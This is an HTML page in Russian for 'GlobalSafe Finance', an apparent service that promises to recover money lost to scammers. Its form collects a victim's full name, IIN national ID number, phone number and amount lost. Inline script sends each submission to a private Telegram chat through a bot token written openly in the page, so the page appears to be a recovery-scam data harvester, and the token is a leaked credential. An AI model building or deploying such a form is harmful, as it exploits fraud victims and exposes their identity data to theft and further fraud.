<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <title>Обращение — GlobalSafe Finance</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../assets/css/global.css">
  <style>
body{background:#000;padding-bottom:70px}
.fp{max-width:520px;margin:0 auto;padding:clamp(20px,4vw,32px) clamp(16px,4vw,16px) 60px}
.fc{position:relative;border-radius:var(--radius2);overflow:hidden;animation:fadeInUp .6s ease both}
.fc::before{content:'';position:absolute;inset:-1px;border-radius:var(--radius2);background:linear-gradient(135deg,rgba(99,102,241,.2),rgba(139,92,246,.1));z-index:0}
.fc-inner{position:relative;z-index:1;background:rgba(6,6,12,.95);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:var(--radius2);padding:clamp(20px,4vw,28px) clamp(16px,4vw,20px) clamp(24px,5vw,36px)}
.fc h1{font-size:1.15rem;font-weight:800;color:#fff;margin-bottom:4px}
.fc .sub{color:var(--text3);font-size:.82rem;margin-bottom:24px}

/* Type selector */
.ts{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
.to{padding:14px 10px;background:rgba(255,255,255,.02);border:2px solid var(--border);border-radius:var(--radius);cursor:pointer;text-align:center;transition:all .3s;position:relative;-webkit-tap-highlight-color:transparent}
.to:active{transform:scale(.97)}
.to.sel{border-color:rgba(99,102,241,.4);background:rgba(99,102,241,.05);box-shadow:0 0 24px rgba(99,102,241,.08)}
.to input{position:absolute;opacity:0;pointer-events:none}
.to-i{font-size:1.5rem;margin-bottom:4px;display:block}
.to-n{font-weight:700;font-size:.75rem;color:#fff;display:block}
.to-d{font-size:.56rem;color:var(--text3);margin-top:2px;display:block}

/* Form */
.fr{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.sb{width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:10px;font-size:.9rem;font-weight:700;cursor:pointer;font-family:var(--font);margin-top:8px;transition:all .3s;box-shadow:0 4px 20px rgba(99,102,241,.25)}
.sb:hover{box-shadow:0 6px 30px rgba(99,102,241,.35)}
.sb:active{transform:scale(.98)}
.sb:disabled{opacity:.4;cursor:not-allowed}
.fs{text-align:center;padding:24px 0;display:none}
.fs-i{font-size:2.5rem;margin-bottom:8px}
.fs h3{color:#fff;margin-bottom:4px;font-size:1rem}
.fs p{color:var(--text3);font-size:.82rem}
.fn{text-align:center;margin-top:12px;font-size:.6rem;color:var(--text4)}

/* Emergency */
.hl{position:relative;border-radius:var(--radius);overflow:hidden;margin-top:14px;text-align:center;animation:fadeInUp .6s ease .3s both}
.hl::before{content:'';position:absolute;inset:-1px;border-radius:var(--radius);background:linear-gradient(135deg,rgba(239,68,68,.15),rgba(239,68,68,.05));z-index:0}
.hl-inner{position:relative;z-index:1;background:rgba(6,6,12,.9);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
.hl h3{font-size:.8rem;font-weight:700;color:#fff;margin-bottom:6px}
.hl-d{font-size:.65rem;color:var(--text3)}

@media(max-width:380px){.ts{grid-template-columns:1fr}.fr{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <div id="nav-container" data-page="contacts"></div>
  <div class="fp">
    <div class="fc"><div class="fc-inner">
      <h1>📋 Центр обращений</h1>
      <div class="sub">Выберите тип и заполните форму</div>
      <form id="cf">
        <div class="ts">
          <label class="to sel" data-t="return"><input type="radio" name="type" value="Возврат средств" checked><span class="to-i">💰</span><span class="to-n">Возврат</span><span class="to-d">Деньги от мошенников</span></label>
          <label class="to" data-t="docs"><input type="radio" name="type" value="Документ"><span class="to-i">📄</span><span class="to-n">Документ</span><span class="to-d">Заявление, жалоба</span></label>
          <label class="to" data-t="feedback"><input type="radio" name="type" value="Обратная связь"><span class="to-i">💬</span><span class="to-n">Связь</span><span class="to-d">Вопрос, отзыв</span></label>
          <label class="to" data-t="org"><input type="radio" name="type" value="Организациям"><span class="to-i">🏛️</span><span class="to-n">Организациям</span><span class="to-d">АРРФР, полиция</span></label>
        </div>
        <div class="rf"><div class="fg"><label>ФИО *</label><input type="text" name="name" placeholder="Иванов Иван" required></div><div class="fg"><label>ИИН *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div></div>
        <div class="fg"><label>Телефон *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div>
        <div class="fg"><label>Платформа</label><input type="text" name="company" placeholder="Название компании"></div>
        <div class="fg"><label>Сумма (₸)</label><input type="text" name="amount" placeholder="500 000"></div>
        <div class="fg"><label>Детали</label><textarea name="comment" placeholder="Что произошло..."></textarea></div>
        <button type="submit" class="sb">Отправить заявку</button>
      </form>
      <div id="fs" class="fs"><div class="fs-i">✅</div><h3>Отправлено!</h3><p>Свяжемся в ближайшее время.</p></div>
      <div class="fn">Все обращения обрабатываются конфиденциально</div>
    </div></div>
    <div class="hl"><div class="hl-inner"><div class="hl-d">Экстренные случаи</div><h3>Если угрожает опасность</h3><p style="font-size:.75rem;color:var(--text3)">Позвоните в ближайшее отделение полиции</p></div></div>
  </div>
  <footer class="ftr"><p>© 2026 GlobalSafe Finance</p></footer>
  <script src="../assets/js/nav.js"></script>
  <script>
  var TG_TOKEN='8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk';
  var TG_CHAT='8471070560';

  document.querySelectorAll('.to').forEach(function(o){o.addEventListener('click',function(){document.querySelectorAll('.to').forEach(function(x){x.classList.remove('sel')});this.classList.add('sel');this.querySelector('input').checked=true})});

  document.getElementById('cf').addEventListener('submit',function(e){
    e.preventDefault();var self=this,btn=self.querySelector('.sb');btn.disabled=true;btn.textContent='Отправка...';
    var type=document.querySelector('input[name="type"]:checked').value;
    var d=new FormData(self);
    var text='📋 *Обращение*\n\n📌 Тип: '+type+'\n\n👤 ФИО: '+(d.get('name')||'')+'\n🆔 ИИН: '+(d.get('iin')||'')+'\n📱 Телефон: '+(d.get('phone')||'');
    if(d.get('company'))text+='\n🏢 Платформа: '+d.get('company');
    if(d.get('amount'))text+='\n💰 Сумма: '+d.get('amount')+' ₸';
    if(d.get('comment'))text+='\n💬 '+d.get('comment');
    fetch('https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,text:text})}).then(function(r){return r.json()}).then(function(d){
      if(d.ok){self.style.display='none';document.getElementById('fs').style.display='block'}
      else{alert('Ошибка');btn.disabled=false;btn.textContent='Отправить заявку'}
    }).catch(function(){alert('Ошибка сети');btn.disabled=false;btn.textContent='Отправить заявку'});
  });
  </script>
</body>
</html>
